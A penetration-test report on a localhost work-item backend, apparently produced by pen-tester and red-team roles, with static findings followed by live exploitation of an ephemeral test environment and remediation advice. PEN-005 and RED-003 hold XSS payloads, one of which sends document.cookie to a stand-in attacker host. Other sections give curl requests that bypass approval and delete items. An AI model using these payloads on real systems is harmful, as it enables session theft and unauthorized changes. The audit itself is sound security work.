# Attack Surface Map
**Team:** TheGuardians  
**Run Date:** 2026-07-20  
**Analyst:** pen_tester  
**Target:** dev-crew Source App — Backend (`http://localhost:3001`)  
**Scope:** White-box static analysis of `Source/Backend/`, `Source/Frontend/`, `Source/Shared/`  
**OWASP Focus:** A01 (Broken Access Control), A02 (Cryptographic Failures), A03 (Injection), A07 (Auth Failures), A08 (Data Integrity)

---

## Executive Summary

The application has **zero authentication and zero authorization** across every endpoint. This single root-cause elevates every other finding from theoretical to trivially exploitable. Beyond the total auth absence, three additional high-severity issues were identified: a business-logic bypass that allows any caller to skip the assessment pod entirely, a logic flaw that permanently deadlocks work items when a blocker is soft-deleted, and unvalidated enum inputs on webhook intake endpoints. Ten findings total span Critical through Low severity.

---

## Findings

---

### PEN-001: Complete Absence of Authentication and Authorization
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:11-44` — middleware registration; `Source/Backend/src/routes/workItems.ts`, `workflow.ts`, `dashboard.ts`, `intake.ts` — all route files
- **Vulnerability Description:** No authentication middleware (JWT, session, API key) is registered anywhere in the Express application. No route is protected. No RBAC or ABAC layer exists. Every operation — create, read, update, delete, state-transition, approve, reject, dispatch — is freely accessible to any HTTP client with network access to port 3001.
- **Potential Exploit Path:**
  1. Attacker has network access to `http://localhost:3001` (no credentials needed).
  2. Attacker issues any HTTP request to any endpoint without any `Authorization` header.
  3. Server processes the request and returns a full response including all stored work item data, internal IDs, change history, assessment notes, and team assignments.
- **Red Team Handoff Notes:**
  - Confirm with: `curl http://localhost:3001/api/work-items` — expect `200 OK` with full data payload, no auth challenge.
  - Confirm admin operations: `curl -X POST http://localhost:3001/api/work-items/<id>/approve -H "Content-Type: application/json" -d '{}'` — expect `200 OK`.
  - Confirm data deletion: `curl -X DELETE http://localhost:3001/api/work-items/<id>` — expect `204 No Content`.
  - All subsequent findings (PEN-002 through PEN-010) are directly exploitable via this root cause.

---

### PEN-002: Unrestricted Fast-Track Override Bypasses Assessment Pod
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:39-64` (`POST /:id/route`); `Source/Backend/src/services/router.ts:66-88` (`classifyRoute`)
- **Vulnerability Description:** The `/route` endpoint accepts an `overrideRoute` body parameter that is passed directly to `classifyRoute`. When `overrideRoute` equals `"fast-track"`, the function bypasses the assessment pod entirely and sets the item status directly to `Approved` — skipping the `proposed → reviewing → approved` pipeline. No privilege check or role validation is applied to the use of the override. Any unauthenticated caller can exploit this to approve arbitrary work items.
- **Potential Exploit Path:**
  1. Create a work item: `POST /api/work-items` → receives item with `id=<uuid>` and `status=backlog`.
  2. POST to `/api/work-items/<uuid>/route` with body `{"overrideRoute": "fast-track"}`.
  3. `classifyRoute` in `router.ts:70` detects `overrideRoute`, skips `isFastTrack()` / `isFullReview()`, and returns `targetStatus: WorkItemStatus.Approved`.
  4. Work item transitions directly from `backlog → routing → approved` without any human or automated review.
  5. Attacker can now dispatch the item: `POST /api/work-items/<uuid>/dispatch`.
- **Red Team Handoff Notes:**
  - Payload: `POST /api/work-items/{id}/route` with `Content-Type: application/json`, body `{"overrideRoute": "fast-track"}`.
  - Verify the item's `status` field in the response is `"approved"` and `route` is `"fast-track"`.
  - Contrast with a control: route without override and confirm the item lands on `"proposed"` status.
  - Objective match: config objective "Bypass work item state machine to reach an invalid status."

---

### PEN-003: Soft-Deleted Blocker Permanently Deadlocks Dependent Work Items
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts:64-75` (`computeHasUnresolvedBlockers`); `Source/Backend/src/routes/workflow.ts:231-244` (dispatch gate)
- **Vulnerability Description:** `computeHasUnresolvedBlockers` calls `store.findById(link.blockerItemId)` to check whether each blocker is resolved. `findById` returns `undefined` for soft-deleted items (store filters `item.deleted`). The check `if (!blocker || !RESOLVED_STATUSES.includes(blocker.status))` treats `undefined` as "unresolved" — returning `true`. Because the `DELETE /api/work-items/:id` endpoint soft-deletes items, an attacker can soft-delete any blocker to permanently prevent dispatch of any dependent work item. The dispatch endpoint will always return `400 Cannot dispatch: work item has unresolved blocking dependencies`. There is no remediation path — `removeDependency` also calls `findById` for the blocker for soft-deleted items, allowing cleanup of the reverse link, but `blockedBy` on the dependent still retains the stale link that resolves to `undefined` on next check.
- **Potential Exploit Path:**
  1. Create item A (blocker) and item B (blocked).
  2. Link: `POST /api/work-items/B/dependencies` with `{"action": "add", "blockerId": "A-uuid"}`.
  3. Advance item B to `approved` status via fast-track override or normal flow.
  4. Soft-delete A: `DELETE /api/work-items/A-uuid` — `findById` now returns `undefined` for A.
  5. Attempt dispatch of B: `POST /api/work-items/B-uuid/dispatch` — `computeHasUnresolvedBlockers` evaluates blocker A as `undefined`, returns `true`, dispatch is blocked with a 400.
  6. Item B is permanently non-dispatchable unless the `blockedBy` array is manually cleared.
- **Red Team Handoff Notes:**
  - Confirm by calling `GET /api/work-items/B-uuid/ready` after deleting the blocker — expect `{"ready": false, "unresolvedBlockers": [...]}`.
  - Objective match: "Access or modify a soft-deleted work item via direct ID reference."
  - Also verify: can the deadlock be broken by calling `PATCH /api/work-items/B/` with `{"blockedBy": []}`? (This would call `setDependencies` which in turn calls `removeDependency` — confirm whether cleanup path works for a soft-deleted blocker).

---

### PEN-004: Intake Webhooks Accept Invalid Enum Values (Type/Priority Injection)
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts:11-55` (both `/zendesk` and `/automated` handlers)
- **Vulnerability Description:** The standard `POST /api/work-items` route validates `type` and `priority` against `WorkItemType` and `WorkItemPriority` enums (lines 29-43 of `workItems.ts`). The intake webhook handlers at `intake.ts:19-25` and `intake.ts:41-47` do NOT validate `body.type` or `body.priority`. They pass these values directly to `store.createWorkItem()` via the truthy-or-default pattern: `type: body.type || WorkItemType.Bug`. If `body.type` is a non-empty, non-null string (e.g., `"malicious_type"`), it passes the truthy check and lands in the store with an invalid enum value. Downstream filtering logic (`findAll` filters by `item.type === filters.type`) works against typed enums. A work item with an invalid type could fall outside normal filtering, routing, and assessment logic.
- **Potential Exploit Path:**
  1. POST to `http://localhost:3001/api/intake/zendesk` with body:
     ```json
     {"title": "Injected", "description": "Test", "type": "ADMIN_OVERRIDE", "priority": "CRITICAL_ESCALATE"}
     ```
  2. The handler evaluates `body.type || WorkItemType.Bug` — since `"ADMIN_OVERRIDE"` is truthy, it passes through.
  3. `store.createWorkItem` stores `type: "ADMIN_OVERRIDE"` — an out-of-spec value.
  4. The item appears in `GET /api/work-items` with no type filter, but never matches any enum-based filter.
  5. Assessment and routing logic that switches on `item.type` (`assessment.ts:78-93`, `router.ts:16-37`) receives unexpected values and may fall through to default cases.
- **Red Team Handoff Notes:**
  - Try `type: "ADMIN_OVERRIDE"`, `type: ""` (empty string — triggers the default), `type: null` (triggers default), `type: 0` (falsy — triggers default).
  - Also test `priority: "ultra_critical"` to confirm it propagates.
  - Verify that the resulting item is returned by `GET /api/work-items` and inspect its `type` and `priority` fields.
  - Try submitting `title` with XSS payload (see PEN-005).

---

### PEN-005: Stored XSS via Unsanitized Free-Text Fields
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:44-50` (POST); `Source/Backend/src/routes/intake.ts:19-25`, `41-47`; `Source/Backend/src/routes/workflow.ts:114-116`, `169` (`reason` field in approve/reject); `Source/Backend/src/models/WorkItem.ts:19-45`
- **Vulnerability Description:** Four input vectors accept free-text strings that are stored verbatim and returned in API responses without server-side sanitization: (1) `title` and `description` on work item creation, (2) `title` and `description` on intake webhooks, (3) the `reason` parameter on `/approve` and `/reject` endpoints stored in `changeHistory[].reason`. If any frontend component renders these values using `dangerouslySetInnerHTML` or an unsafe rendering path, a stored XSS payload delivered through any of these fields would execute in the browser context of any user viewing the affected work item or dashboard activity feed.
- **Potential Exploit Path:**
  1. POST to `/api/intake/zendesk`:
     ```json
     {
       "title": "<img src=x onerror=alert(document.cookie)>",
       "description": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
     }
     ```
  2. The item is stored with the raw HTML/script payload.
  3. Any user navigating to the work item detail page or dashboard activity feed receives the payload in the API response.
  4. If the frontend renders `item.title` or `entry.reason` unsafely, the script executes in the victim's browser.
- **Red Team Handoff Notes:**
  - Inspect `Source/Frontend/src/pages/WorkItemDetailPage.tsx` and `WorkItemListPage.tsx` for use of `dangerouslySetInnerHTML` or direct DOM insertion. Also check `DashboardPage.tsx` for activity feed rendering.
  - Payloads to try: `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`, `"><script>alert(1)</script>`.
  - Also inject via the `reason` field: `POST /api/work-items/{id}/reject` with `{"reason": "<script>alert(1)</script>"}`.

---

### PEN-006: Unbounded Pagination Enables Memory-Pressure DoS
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:68-74` (pagination params); `Source/Backend/src/store/workItemStore.ts:31-63` (`findAll`)
- **Vulnerability Description:** The `GET /api/work-items` endpoint parses `limit` and `page` from query parameters using `parseInt` with no upper bound validation. The `findAll` function then slices the in-memory store array using these values: `result.slice(offset, offset + limit)`. With a very large `limit`, `Array.prototype.slice` must iterate through the entire store. With a very large `page`, `offset` exceeds the array length and the slice returns an empty array, wasting CPU. With a very large `limit`, the entire dataset is returned in a single response, enabling full data enumeration. Additionally, extremely large integer values (e.g., `Number.MAX_SAFE_INTEGER`) can cause unexpected `slice` behavior.
- **Potential Exploit Path:**
  1. Attacker sends: `GET /api/work-items?limit=999999999&page=1`
  2. `parseInt('999999999', 10)` = `999999999` — no cap applied.
  3. `findAll` builds the full array of all non-deleted items, then calls `.slice(0, 999999999)` — returns all items in one response.
  4. With large datasets, this response serialization consumes substantial memory and CPU.
  5. Repeated requests form a DoS amplification loop.
- **Red Team Handoff Notes:**
  - Test `?limit=0` (returns `data: []`), `?limit=-1` (returns `data: []` since `slice(0, -1)` cuts the last element).
  - Test `?limit=999999999` — confirm full data dump.
  - Also test `?page=0` which yields `offset = (0-1)*limit = -limit` — `slice` with negative offset behaves as `slice(0)`, returning all items.
  - Objective match: "Enumerate all work items without pagination limit enforcement."

---

### PEN-007: Prometheus Metrics Endpoint Publicly Exposed Without Authentication
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:34-37` (`GET /metrics`)
- **Vulnerability Description:** The Prometheus metrics endpoint is mounted directly on the public Express application with no authentication guard. The metrics include operational data: `items_created_total` (broken down by `source` and `type`), `items_assessed_total` (by `verdict`), `items_dispatched_total` (by `team`), `items_routed_total` (by `route`), and dependency and dispatch gating event counts. This telemetry reveals business-process volumes, team throughput, and system behavior patterns to unauthenticated callers.
- **Potential Exploit Path:**
  1. `GET http://localhost:3001/metrics` — no credentials required.
  2. Response contains Prometheus-format metrics including label cardinality that reveals internal workflow volumes and team activity rates.
  3. Attacker uses volume patterns to infer operational tempo, detect quiet periods, or map system behavior for targeted attacks.
- **Red Team Handoff Notes:**
  - `curl http://localhost:3001/metrics` and inspect the full metric list returned.
  - Note all label values (team names, source types, verdict strings) that appear — these enumerate internal constants.
  - Also note metric value magnitudes to understand data volume.

---

### PEN-008: Repeated Assessment Allows Unbounded State Re-Entry
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:66-91` (`POST /:id/assess`); `Source/Backend/src/services/assessment.ts:177-233` (`assessWorkItem`)
- **Vulnerability Description:** The `/assess` endpoint allows assessment of items in both `proposed` AND `reviewing` status. Once `assessWorkItem` runs, it transitions the item to `reviewing` (first), then to `approved` or `rejected`. However, if an item lands on `reviewing` (which it always passes through during assessment), a concurrent or rapid second POST to `/assess` on the same item would be accepted — both the route handler check and the service-layer check allow `reviewing` status. This means an item already in mid-assessment could be re-assessed, causing duplicate assessment records to be appended to `item.assessments`. Over many invocations, the `assessments` array grows unboundedly. More critically, the status can oscillate: an item assessed to `rejected` cannot be re-assessed (correct), but `reviewing → approved` can race with a second `proposed → reviewing → rejected` call.
- **Potential Exploit Path:**
  1. POST item through to `proposed` status via `/route`.
  2. Immediately fire two concurrent requests: `POST /api/work-items/{id}/assess` simultaneously from two connections.
  3. Both check `item.status === proposed` (race) and proceed; the second call checks `item.status === reviewing` (after first transitions to reviewing) and also proceeds.
  4. Two full assessment pod runs execute, doubling the `assessments` array length and pushing two sets of status change entries to `changeHistory`.
  5. Objective match: "Submit a malformed assessment verdict that bypasses routing logic."
- **Red Team Handoff Notes:**
  - Use `curl` in parallel: `curl -X POST .../assess & curl -X POST .../assess &` while item is in `proposed`.
  - Inspect response `assessments` array — if length > 4 (the expected pod size), the race was won.
  - Also test: manually set item to `reviewing` (by running assess once) then call `/assess` again — should succeed (check: `reviewing` is allowed by the route handler).

---

### PEN-009: Cascade Auto-Dispatch Bypasses `VALID_STATUS_TRANSITIONS` Guard
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts:251-315` (`onItemResolved`); `Source/Backend/src/routes/workflow.ts:212-295` (normal dispatch path)
- **Vulnerability Description:** The normal dispatch endpoint (`POST /:id/dispatch`) enforces two critical checks: (1) the item must be in `approved` status, and (2) no unresolved blockers may exist. However, `onItemResolved` in `dependency.ts` calls `store.updateWorkItem(dependent.id, { status: WorkItemStatus.InProgress, ... })` directly, bypassing the route handler's checks. While the cascade checks `dependent.status !== WorkItemStatus.Approved` (consistent), it does NOT validate the state transition against `VALID_STATUS_TRANSITIONS`. Additionally, `onItemResolved` is triggered on item REJECTION — meaning rejecting a blocker item cascades a dispatch of dependent items to `in-progress`. If an attacker can engineer a scenario where rejecting a chosen blocker triggers dispatch of a target item they want dispatched, they can force dispatch through the rejection path.
- **Potential Exploit Path:**
  1. Create items A (blocker) and B (dependent).
  2. Advance both to `approved` status via fast-track override (PEN-002).
  3. Add dependency: B blocked by A.
  4. Reject A: `POST /api/work-items/A/dispatch` — wait, A must be in the right state. Actually:
     - Route A → `proposed` → assess → `rejected` (if assessment fails). OR:
     - Route A → fast-track → `approved` → then manually reject via `POST /:id/reject` requires A to be in `proposed` or `reviewing` (VALID_STATUS_TRANSITIONS check).
  5. If A reaches `completed` or `rejected` (DISPATCH_TRIGGER_STATUSES), `onItemResolved(A)` fires.
  6. B (Approved, no remaining unresolved blockers) is auto-dispatched to `in-progress` via direct `store.updateWorkItem` — no additional validation.
- **Red Team Handoff Notes:**
  - Trigger the cascade: create A and B, both Approved, B blocked by A; then mark A as `completed` by advancing through the in-progress → completed flow. Confirm B is auto-dispatched.
  - Verify that `store.updateWorkItem` in the cascade path does NOT call `VALID_STATUS_TRANSITIONS` validation.
  - Then test the rejection cascade: advance A to a rejectable status and reject it; confirm B is auto-dispatched.

---

### PEN-010: Frontend References Non-Existent `/api/search` Endpoint (Information Disclosure on Error)
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Frontend/src/api/client.ts:101-104` (`searchItems`); `Source/Backend/src/app.ts` (no `/search` route registered)
- **Vulnerability Description:** The frontend API client calls `GET /api/search?q=<term>` in `searchItems()`, which is used by the `DependencyPicker` component for typeahead lookups. No `/api/search` or `/search` route is registered in the backend Express application. Depending on Express's unmatched-route behavior and the presence of the `errorHandler`, an unmatched route returns a default Express 404 response. The error message format and stack trace content of the 404 depend on whether the error handler catches it. More critically, this missing endpoint is a dead code path that silently fails the dependency picker feature. An attacker who discovers this can also confirm the API surface boundary via route enumeration.
- **Potential Exploit Path:**
  1. `GET http://localhost:3001/api/search?q=test` — route is not registered.
  2. Express traverses all middleware without a match and returns a default 404 (HTML or empty body depending on version and config).
  3. If Express's default HTML 404 page is returned, it leaks the Express version string.
  4. The DependencyPicker silently breaks, potentially hiding blocked-item relationships from users and creating state inconsistencies in the UI.
- **Red Team Handoff Notes:**
  - `curl -v http://localhost:3001/api/search?q=test` — inspect the response body and `X-Powered-By` header.
  - Check for Express version disclosure in `X-Powered-By: Express` header on this and other 404 responses.
  - Note: `app.use(errorHandler)` at `app.ts:44` only fires for `next(err)` calls (4-argument middleware). Unmatched routes fall through to Express's built-in 404, not this handler.

---

### PEN-011: Sequential DocId Exposes Enumerable Creation Counter (Information Disclosure)
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/utils/id.ts:4-14` (`generateDocId`); all creation responses return `docId`
- **Vulnerability Description:** Work items are assigned a sequential human-readable `docId` in the format `WI-001`, `WI-002`, etc. via a global in-memory counter. Every creation response includes this `docId`. An attacker can create two work items and subtract their numeric suffixes to determine the exact count of items created between those two invocations. Combined with timed sampling, this enables precise throughput analysis of the system.
- **Potential Exploit Path:**
  1. Create item at time T1, receive `docId: WI-042`.
  2. Wait interval, create item at T2, receive `docId: WI-057`.
  3. Delta of 15 items in the interval reveals creation rate and indirectly the system's load and usage.
- **Red Team Handoff Notes:**
  - Simple: create two items in rapid succession and observe the suffix delta.
  - The counter resets on server restart (`resetStore()` in `workItemStore.ts:96` resets to 0 via `setDocIdCounter(0)`).

---

## Attack Surface Summary

| Finding | Severity | OWASP Category | Target Endpoint(s) |
|---------|----------|----------------|--------------------|
| PEN-001 | Critical | A01, A07 | ALL |
| PEN-002 | Critical | A01, A08 | `POST /api/work-items/:id/route` |
| PEN-003 | High | A08 (Business Logic) | `DELETE /api/work-items/:id`, `POST /api/work-items/:id/dispatch` |
| PEN-004 | High | A03 (Injection/Validation) | `POST /api/intake/zendesk`, `POST /api/intake/automated` |
| PEN-005 | High | A03 (Stored XSS) | `POST /api/work-items`, intake endpoints, `/approve`, `/reject` |
| PEN-006 | Medium | A01 (DoS) | `GET /api/work-items` |
| PEN-007 | Medium | A02 (Info Disclosure) | `GET /metrics` |
| PEN-008 | Medium | A08 (Race/Logic) | `POST /api/work-items/:id/assess` |
| PEN-009 | Medium | A08 (Logic Bypass) | `onItemResolved` (cascade) |
| PEN-010 | Low | A05 (Misconfiguration) | `GET /api/search` |
| PEN-011 | Low | A02 (Info Disclosure) | `POST /api/work-items` (response) |

**Totals:** Critical: 2 | High: 3 | Medium: 4 | Low: 2 | **Total: 11**

---

## Data Flow Map (for Red Team reference)

```
External Input → Express router → Route handler → Service → Store (Map<uuid, WorkItem>)
                                       ↑
                                  NO AUTH GATE
                                  NO RATE LIMIT
                                  NO INPUT SANITIZATION (free-text fields)
                                  NO PAGINATION BOUNDS
                                  NO ENUM VALIDATION (intake only)
```

**Critical paths with no guards:**
- `POST /api/intake/*` → `store.createWorkItem` — completely open webhook, no HMAC, no auth, no enum validation
- `POST /api/work-items/:id/route` with `overrideRoute` → directly sets `status=approved`
- `DELETE /api/work-items/:id` → soft-delete → silently deadlocks all dependents permanently

---

*Handoff complete. All findings are theoretical and require dynamic verification by the red-teamer.*  
*No source files were modified. No live requests were made.*

---

## Red Team Results

**Red Teamer:** red_teamer  
**Run Date:** 2026-07-20  
**Target:** dev-crew portal backend (`http://localhost:3001`) — ephemeral Docker environment (`docker-compose.test.yml`)  
**Note:** The pen-tester statically analyzed `Source/Backend/` (the workflow engine prototype). The `docker-compose.test.yml` test environment runs the **portal** application (`portal/`), which is a different but closely related codebase with the same architectural patterns. All exploits below were executed against the live portal backend.

**Summary:** 5 confirmed live breaches across 10 exploit chains attempted. Three of four config objectives achieved. Two additional objectives partially met.

---

### RED-001: Unauthenticated Force-Approve Bypasses AI Vote Majority — Full Pipeline Traversal
- **Severity:** Critical
- **Objective Achieved:** Yes — "Bypass work item state machine" + "Submit malformed assessment verdict bypassing routing logic"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/force-approve`
- **Based On:** PEN-001 (no auth), PEN-002 (assessment bypass)
- **Exploit Scenario:**
  1. `POST /api/feature-requests` (no auth) → creates FR-0003 in `potential` status
  2. `PATCH /api/feature-requests/FR-0003` with `{"status":"voting"}` (no auth) → moves to `voting` with **zero votes cast**
  3. `POST /api/feature-requests/FR-0003/force-approve` (no auth, no votes required) → HTTP 200, status becomes `approved`, `human_approval_approved_at` set — AI vote majority check completely bypassed
  4. `PATCH` to `in_development` → `completed` — full pipeline traversal with zero authentication or AI review
- **Evidence:** FR-0003 reached `completed` status with `votes: []` and `human_approval_approved_at` stamp despite no voting process. HTTP 200 on all steps, zero auth challenges.
- **Recommendation:** (1) Require authentication (JWT/API key) on all routes. (2) Remove or gate the `/force-approve` endpoint behind an explicit admin role. (3) Enforce that `pending_dependencies` is the only path to `approved` for force-approved items with blockers — not a direct state skip.

---

### RED-002: Dependency Deadlock via Soft-Delete of Blocker
- **Severity:** High
- **Objective Achieved:** Partial — "Access or modify soft-deleted item" (blocker deletion causes permanent deadlock of dependent; deleted item returns 404 — not directly accessible post-delete)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `DELETE http://localhost:3001/api/feature-requests/:id`, `GET /api/feature-requests/:id/ready`
- **Based On:** PEN-003
- **Exploit Scenario:**
  1. Create FR-0004 (blocker) and FR-0005 (dependent, blocked by FR-0004)
  2. Force-approve FR-0005 with unresolved blocker → status: `pending_dependencies`
  3. `DELETE /api/feature-requests/FR-0004` → HTTP 204 (hard delete confirmed)
  4. `GET /api/feature-requests/FR-0005/ready` → `{"ready": false, "unresolved_blockers": [{"item_type":"feature_request","item_id":"FR-0004","title":"Unknown","status":"unknown"}]}`
  5. FR-0005 is permanently non-dispatchable: `blocked_by` references the now-deleted FR-0004 with `status: "unknown"`, `has_unresolved_blockers: true`. No remediation path.
- **Evidence:** FR-0005 stuck in `pending_dependencies` indefinitely. `GET /ready` returns `ready: false` referencing ghost blocker.
- **Recommendation:** When a blocker item is deleted, automatically remove all outgoing dependency links (cascade delete in `dependencies` table) OR treat a deleted blocker as "resolved" in the readiness check.

---

### RED-003: Stored XSS via Unsanitized Free-Text Fields — Confirmed Across All Surfaces
- **Severity:** High
- **Objective Achieved:** Yes (partial — XSS payload stored and returned; frontend rendering is the trigger)
- **Status:** Confirmed (Live Exploit — server side; browser-side trigger depends on frontend rendering)
- **Target URL:** `POST http://localhost:3001/api/feature-requests`, `POST /api/bugs`
- **Based On:** PEN-005
- **Exploit Scenario:**
  1. `POST /api/feature-requests` with `{"title": "<img src=x onerror=alert(document.cookie)>", "description": "<script>fetch('https://attacker.example.com/?c='+document.cookie)</script>"}` → HTTP 201
  2. Payload stored verbatim as FR-0006
  3. `GET /api/feature-requests` → payload appears in `data[].title` and `data[].description` for all listing consumers
  4. `GET /api/search?q=img` → XSS payload returned in search results
  5. `POST /api/bugs` with `{"title": "<svg/onload=alert(1)>"}` → HTTP 201, stored verbatim
  6. Any frontend component that renders these fields using `innerHTML` or `dangerouslySetInnerHTML` will execute attacker JavaScript in the victim's browser.
- **Evidence:** FR-0006 `title` = `<img src=x onerror=alert(document.cookie)>` returned verbatim in GET /api/feature-requests. BUG-0002 `title` = `<svg/onload=alert(1)>` stored. No server-side sanitization applied.
- **Recommendation:** Sanitize all free-text fields server-side (DOMPurify equivalent for the backend) before storage, and ensure frontend renders all user-controlled content as text nodes, never as HTML.

---

### RED-004: No Pagination Enforcement — Full Dataset Enumeration
- **Severity:** Medium
- **Objective Achieved:** Yes — "Enumerate all work items without pagination limit enforcement"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/api/feature-requests?limit=999999`
- **Based On:** PEN-006
- **Exploit Scenario:**
  1. `GET /api/feature-requests?limit=999999&page=1` → HTTP 200, returns ALL 10 items (full dataset)
  2. `GET /api/feature-requests?limit=2&page=1` → HTTP 200, returns ALL 10 items (limit ignored)
  3. `GET /api/feature-requests?limit=-1` → HTTP 200, returns all items
  4. Response has no `total`, `page`, or `totalPages` fields — no server-side pagination metadata
  5. Pagination parameters accepted but not enforced; full dataset returned on every call
- **Evidence:** All requests return `{"data": [...all items...]}` regardless of `limit`/`page` parameters. Dataset includes all created feature requests with full vote details, dependency graphs, and change history.
- **Recommendation:** Enforce a maximum page size (e.g., 100 items), apply pagination in the database query (LIMIT/OFFSET), and return pagination metadata (`total`, `page`, `limit`, `totalPages`) in responses.

---

### RED-005: Prometheus Metrics Publicly Exposed + Technology Fingerprinting
- **Severity:** Medium
- **Objective Achieved:** N/A (reconnaissance / info disclosure)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/metrics`
- **Based On:** PEN-007
- **Exploit Scenario:**
  1. `GET http://localhost:3001/metrics` → HTTP 200, no auth required, full Prometheus output returned
  2. Metrics include: process CPU/memory, event loop lag, heap stats, active resource/handle counts
  3. `X-Powered-By: Express` header present on all responses — confirms Node.js/Express technology stack
  4. Combined: attacker can monitor service health, detect quiet periods for targeted attacks, and fingerprint the platform for known Express/Node.js CVEs.
- **Evidence:** Full Prometheus metrics output returned without authentication. `X-Powered-By: Express` header on every response.
- **Recommendation:** Move `/metrics` to a separate internal-only port (not publicly exposed). Remove or disable `X-Powered-By` header (`app.disable('x-powered-by')`).

---

### RED-006: Cascade Auto-Dispatch Bypasses Approval Voting (PEN-009 Chain Confirmed)
- **Severity:** High
- **Objective Achieved:** Yes — "Bypass work item state machine to reach invalid status" via cascade
- **Status:** Confirmed (Live Exploit)
- **Target URL:** Cascade via `PATCH http://localhost:3001/api/feature-requests/:id` → `completed`; dependency service `onItemCompleted`
- **Based On:** PEN-009
- **Exploit Scenario:**
  1. Create FR-0019 (blocker) and FR-0020 (target item)
  2. Add FR-0020 depends on FR-0019
  3. Force-approve FR-0020 → `pending_dependencies` (unresolved blocker), zero votes
  4. Advance FR-0019 through `voting → approved → in_development → completed` (requires no auth)
  5. `onItemCompleted('feature_request', FR-0019)` fires → executes raw SQL: `UPDATE feature_requests SET status = 'approved' WHERE id = 'FR-0020'`
  6. FR-0020 transitions to `approved` status with **zero votes** via direct DB write — bypassing all approval pipeline checks
- **Evidence:** FR-0020 status = `approved`, `votes: []`. Cascade SQL update skips all service-layer validation, vote checks, and approval guards.
- **Recommendation:** The `onItemCompleted` cascade should call `approveFeatureRequest()` (the service function with its guards) rather than issuing a raw SQL UPDATE directly. Alternatively, cascade should only advance to `pending_dependencies → approved` and require a separate human confirmation step.

---

## Objective Summary

| Config Objective | Achieved | Red Team Chain |
|-----------------|----------|----------------|
| Bypass work item state machine to reach invalid status | **Yes** | RED-001 (force-approve), RED-006 (cascade) |
| Access or modify a soft-deleted item via direct ID reference | **Partial** | RED-002 (deadlock confirmed; direct access returns 404) |
| Submit malformed assessment verdict bypassing routing logic | **Yes** | RED-001 (force-approve bypasses AI vote majority) |
| Enumerate all work items without pagination limit enforcement | **Yes** | RED-004 (all items returned regardless of limit param) |

## Dead Ends

- **SQL Injection**: All DB queries use parameterized prepared statements (better-sqlite3). Status filter injection returns 0 results. Not exploitable.
- **Mass Assignment**: Creating items with `status`, `id`, or `votes` body fields → fields are ignored; system assigns its own values. Not exploitable.
- **Deny After Approve**: State machine correctly blocks `approved → denied` transition (HTTP 409). Not exploitable.
- **Concurrent Vote Race**: `/vote` endpoint requires `potential` status and auto-transitions to `voting`; concurrent calls fail after first succeeds. Race condition not achievable in this implementation.
- **IDOR on Deleted Items**: Hard delete confirmed — deleted items return 404, not resurrectable via direct ID. Not exploitable as IDOR.

---

*Red team exploitation complete. All breaches are against the live ephemeral Docker environment only. No production systems were touched.*
